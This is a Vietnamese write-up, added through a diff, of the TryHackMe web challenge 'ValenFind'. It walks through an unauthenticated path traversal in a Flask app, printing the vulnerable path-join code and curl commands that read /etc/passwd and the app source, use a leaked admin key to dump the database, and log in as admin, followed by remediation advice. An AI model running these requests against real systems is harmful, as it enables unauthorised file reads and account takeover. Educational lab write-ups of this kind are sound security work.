@@ -1,0 +1,195 @@
+---
+title: 'ValenFind: một lỗi path traversal dẫn tới đọc file bằng quyền root, lộ khóa và chiếm toàn bộ tài khoản'
+description: Phân tích challenge ValenFind trên TryHackMe — một lỗi path traversal không cần đăng nhập cho phép đọc file tùy ý bằng quyền root, làm lộ admin key hardcode, xuất cả cơ sở dữ liệu lưu mật khẩu plaintext và dẫn tới chiếm quyền tài khoản admin.
+date: 2026-10-04
+platform: tryhackme
+room: ValenFind
+roomUrl: https://tryhackme.com/room/lafb2026e10
+difficulty: medium
+tags:
+  - web
+  - flask
+  - path-traversal
+  - lfi
+  - account-takeover
+vulnClasses:
+  - path traversal / LFI
+  - hardcoded secret
+  - plaintext password storage
+  - broken access control
+translation: done
+draft: true
+---
+
+_Phân tích challenge web "ValenFind" trong sự kiện Love at First Breach 2026 của
+TryHackMe. Chỉ một lỗi path traversal không cần xác thực cũng đủ để đọc bất kỳ file
+nào trên máy bằng quyền root. Ta dùng nó để đọc chính source của ứng dụng, lấy ra một
+admin key hardcode, xuất toàn bộ cơ sở dữ liệu — nơi mật khẩu được lưu dạng plaintext —
+rồi đăng nhập với tư cách admin. Không cần tài khoản ở bất kỳ bước nào._
+
+> Flag, admin key bị lộ và các mật khẩu khôi phục được đều đã được che. ValenFind là
+> một challenge huấn luyện hợp pháp trên TryHackMe; mọi thao tác ở đây đều thực hiện
+> trên một mục tiêu luyện tập hợp lệ. Các giá trị hiển thị dạng `<redacted>` là giá
+> trị thật trên máy nhưng được giấu đi ở đây.
+
+## TL;DR — toàn bộ chuỗi tấn công
+
+`GET /api/fetch_layout?layout=…` ghép một tên file do người dùng kiểm soát vào một thư
+mục gốc **mà không hề kiểm tra traversal hay đường dẫn tuyệt đối** → đọc `/etc/passwd`
+để chứng minh có thể đọc file tùy ý **bằng quyền root** → đọc `/opt/Valenfind/app.py`
+để lấy ra một **`ADMIN_API_KEY` hardcode** → gửi khóa đó tới `/api/admin/export_db` và
+tải về toàn bộ **cơ sở dữ liệu SQLite (vẫn không cần xác thực)** → mật khẩu được lưu
+dạng **plaintext** → đăng nhập bằng admin `cupid` → **chiếm toàn bộ hệ thống**.
+
+Từ ẩn danh tới admin, trong chưa đầy một phút, hoàn toàn có thể viết script tự động.
+
+## Mục tiêu
+
+```bash
+export IP=<target-ip>
+```
+
+ValenFind là một ứng dụng Flask (Werkzeug 3.0.1, Python 3.12.3) phục vụ trên cổng 5000:
+
+```
+http://$IP:5000   →  ValenFind (Flask/Werkzeug)
+```
+
+Đây là một web app hẹn hò theo chủ đề Valentine. Những web app cho phép chọn "theme"
+hay "layout" rất đáng soi kỹ — bất cứ chỗ nào server mở một file có tên đến từ request
+đều là ứng viên cho **path traversal / đọc file cục bộ (LFI)**.
+
+## Lỗ hổng: `/api/fetch_layout` mở đúng file mà bạn chỉ định
+
+Endpoint xử lý theme dựng đường dẫn file thẳng từ tham số truy vấn `layout`:
+
+```python
+layout_file = request.args.get('layout', 'theme_classic.html')
+base_dir = os.path.join(os.getcwd(), 'templates', 'components')
+file_path = os.path.join(base_dir, layout_file)   # abs path wins; ../ never stripped
+with open(file_path, 'r') as f:
+    return f.read()
+```
+
+Hai chi tiết của Python khiến lỗi này trở nên chí mạng:
+
+- **`os.path.join(base, "/etc/passwd")` trả về `/etc/passwd`.** Một đường dẫn tuyệt
+  đối ở tham số thứ hai vứt bỏ hoàn toàn thư mục gốc.
+- **`../` không bao giờ bị loại bỏ**, nên một payload tương đối cũng leo ra khỏi thư
+  mục dự kiến dễ dàng không kém.
+
+"Biện pháp bảo vệ" duy nhất là một blocklist chuỗi con cho `.db` / `seeder.py` — né
+tránh cực kỳ dễ, và chẳng liên quan gì đến việc đọc source hay file hệ thống. Quan
+trọng hơn, endpoint này **không kiểm tra session**, nên có thể gọi tới _trước khi_ xác
+thực. Và tiến trình chạy bằng **root** (`/proc/self/cmdline` → `/usr/bin/python3
+/opt/Valenfind/app.py`, `HOME=/root`), nên "đọc file bất kỳ" nghĩa là _bất kỳ_ file nào.
+
+## Bước 1 — chứng minh primitive: đọc `/etc/passwd`
+
+```bash
+curl -G "http://$IP:5000/api/fetch_layout" --data-urlencode 'layout=/etc/passwd'
+# -> root:x:0:0:root:/root:/bin/bash ...   (real contents)
+```
+
+Một **negative control** xác nhận đây là truy cập hệ thống file thật sự, không phải
+kiểu phản hồi dội lại (reflected echo) — khi yêu cầu một file không tồn tại thì nhận
+được `errno 2` thật:
+
+```bash
+curl -G "http://$IP:5000/api/fetch_layout" --data-urlencode 'layout=/etc/passwd_nope'
+# -> Error loading theme layout: [Errno 2] No such file or directory
+```
+
+Sự khác biệt đó rất quan trọng trong một báo cáo thật: lỗi chứng tỏ server thực sự
+`open()` đường dẫn mà ta kiểm soát.
+
+## Bước 2 — đọc chính source của ứng dụng, lấy admin key
+
+File đáng đọc nhất khi có một primitive LFI thường là source của ứng dụng — vì nó chứa
+các secret. Ta biết cmdline của tiến trình trỏ tới `/opt/Valenfind/app.py`:
+
+```bash
+curl -G "http://$IP:5000/api/fetch_layout" --data-urlencode 'layout=/opt/Valenfind/app.py'
+# -> ADMIN_API_KEY = "<redacted-admin-key>"
+```
+
+Source trao cho ta một **admin API key hardcode**. Đọc source cũng cho biết điều _không_
+nên phí thời gian: Flask `secret_key = os.urandom(24)` ngẫu nhiên mỗi lần khởi động, nên
+giả mạo cookie là ngõ cụt — rò rỉ credential mới là con đường thật.
+
+## Bước 3 — xuất toàn bộ cơ sở dữ liệu bằng khóa bị lộ
+
+Admin key kiểm soát một endpoint xuất cơ sở dữ liệu. Vì khóa giờ đã nằm trong tay ta,
+lệnh gọi này về bản chất vẫn **không cần xác thực**:
+
+```bash
+curl -H 'X-Valentine-Token: <redacted-admin-key>' \
+     "http://$IP:5000/api/admin/export_db" -o leak.db     # 200, ~16 KB SQLite
+
+sqlite3 leak.db 'SELECT username,password FROM users;'
+# -> cupid|<redacted-password>   (+ 10 other users, all plaintext)
+```
+
+Cơ sở dữ liệu lưu mật khẩu dạng **plaintext** — không hề hash. Điều đó biến một vụ rò
+rỉ dữ liệu thành chiếm quyền tài khoản tức thì cho **cả 11 người dùng**, kèm theo email,
+số điện thoại và địa chỉ nhà của họ (PII thật trong một vụ lộ dữ liệu ngoài đời thật).
+
+## Bước 4 — chiếm quyền tài khoản admin
+
+Có trong tay mật khẩu plaintext của admin, ta chỉ việc đăng nhập:
+
+```bash
+curl -i -d 'username=cupid&password=<redacted-password>' "http://$IP:5000/login"
+# -> 302 /dashboard, session decodes to {"user_id":8,"username":"cupid"}
+```
+
+Giờ ta là `cupid`, quản trị viên. Flag của challenge được giấu trong trường `address`
+của admin trong cơ sở dữ liệu đã xuất:
+
+```
+THM{<redacted>}
+```
+
+Request ẩn danh → đọc file bằng quyền root → khóa bị lộ → toàn bộ DB → đăng nhập admin.
+Mỗi nấc thang đều hoặc không cần xác thực, hoặc chỉ được "bảo vệ" bằng một secret mà
+chính ứng dụng tự làm lộ.
+
+## Tác động
+
+**Nghiêm trọng — CVSS 3.1 9.8** (`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`). Toàn bộ chuỗi
+tấn công đều từ xa, không cần xác thực, tất định và viết script được trong vài giây:
+
+- **Đọc file tùy ý bằng quyền root** — source code, secret, `/etc/passwd`, mọi file.
+- **Rút toàn bộ cơ sở dữ liệu** — username, **mật khẩu plaintext**, email, số điện
+  thoại và địa chỉ của cả 11 người dùng (PII kèm nghĩa vụ công bố vi phạm theo GDPR/CCPA).
+- **Chiếm quyền tài khoản của mọi người dùng, kể cả admin**, đã được xác nhận bằng đăng nhập.
+
+## Khuyến nghị khắc phục — chặn mọi nấc thang
+
+1. **Giới hạn đường dẫn trong `fetch_layout`.** Phân giải bằng `os.path.realpath` và từ
+   chối mọi đường dẫn đã phân giải mà không nằm trong thư mục components, hoặc tốt hơn,
+   ánh xạ một **allow-list** cố định các tên theme sang file. Và **đừng chạy ứng dụng
+   bằng root** — nguyên tắc đặc quyền tối thiểu (least privilege) đã có thể khoanh vùng
+   được vụ đọc file.
+2. **Bỏ `ADMIN_API_KEY` hardcode.** Yêu cầu một session admin thực sự đã xác thực cho
+   `/api/admin/export_db`, và xoay vòng khóa đã lộ (coi như đã bị cháy).
+3. **Hash mật khẩu** bằng bcrypt/argon2 (ví dụ
+   `werkzeug.security.generate_password_hash`). Lưu plaintext đã biến một lỗi đọc file
+   thành một vụ lộ credential toàn diện.
+
+## Bài học rút ra
+
+- **Đừng bao giờ dựng đường dẫn file từ input người dùng mà không giới hạn nó.**
+  `os.path.join` _không_ bảo vệ bạn — một đường dẫn tuyệt đối hay `../` là đi ra ngoài
+  ngay. Hãy phân giải rồi kiểm tra tiền tố (prefix-check), hoặc dùng allow-list.
+- **Một lỗi LFI là công cụ tìm khóa.** File đầu tiên nên đọc gần như luôn là chính
+  source của ứng dụng; các secret hardcode trong đó trao cho bạn bước tiếp theo miễn phí.
+- **Mật khẩu plaintext biến bất kỳ lỗi đọc file nào thành chiếm quyền tài khoản toàn
+  diện.** Hash không phải là tùy chọn — nó là thứ giới hạn bán kính thiệt hại.
+- **Đặc quyền tối thiểu rất quan trọng.** Cùng một lỗi, đọc được `/etc/shadow` bằng root
+  so với chỉ đọc được một file template quyền thấp, là khác biệt giữa "nghiêm trọng" và
+  "phiền phức".
+
+Cảm ơn bạn đã đọc. ValenFind là một bài học cô đọng về cách một lỗi path traversal tầm
+thường — cộng với một khóa hardcode và mật khẩu plaintext — làm sụp đổ cả một ứng dụng
+từ bên ngoài, không cần đăng nhập.
